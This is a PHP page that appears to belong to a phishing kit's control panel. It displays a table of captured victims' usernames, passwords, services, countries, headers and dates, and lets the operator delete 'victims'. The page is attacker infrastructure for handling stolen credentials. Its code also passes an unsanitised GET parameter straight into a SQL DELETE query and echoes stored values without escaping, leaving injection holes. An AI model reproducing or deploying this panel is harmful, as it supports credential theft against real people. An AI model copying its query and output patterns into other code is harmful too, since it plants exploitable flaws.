<div class="content">
<table class="table table-hover" style="width: 30cm;" align="center">
      <thead>
        <tr>
          <th>#</th>
          <th>Username</th>
          <th>Password</th>
          <th>Service</th>
          <th>Country</th>
          <th>Headers</th>
          <th>Date</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <?php
        
        //
        // Deleting the selected page.
        //
        
        $delete = @$_GET['delete'];
        
        if ($delete != "") {
            if (mysql_query("DELETE FROM phishing_module WHERE id=".$delete)) {
                echo "<div align='center' class=\"alert alert-success\" role=\"alert\">
                    <strong>Success!</strong> the victim has been deleted successfuly.</div>";
            } else { die(mysql_error()); }
        }
        
        
        //
        // Extracting data from database.
        //
        $get_phished = mysql_query("SELECT * FROM phishing_module");
        if (mysql_num_rows($get_phished) > 0) {
            while($row = mysql_fetch_array($get_phished)){
        ?>
        <tr>
          <th scope="row"><?php echo $row['id']; ?></th>
          <td><?php echo $row['username']; ?></td>
          <td><?php echo $row['password']; ?></td>
          <td><span class="label label-default"><?php echo $row['service']; ?></span></td>
          <td><?php echo $row['country']; ?></td>
          <td><a class="btn btn-default btn-xs" href="index.php?id=1&action=6&show=<?php echo $row['id']; ?>" role="button">Show</a></td>
          <td><?php echo $row['date']; ?></td>
          <td><a href="index.php?id=1&action=0&delete=<?php echo $row['id']; ?>"><img height="12" width="12" src="images/glyphicons-208-remove-2.png" /></a></td>
        </tr>
        <?php
            } // end while
        
        } // end if       
        ?>
      </tbody>
</table>
</div>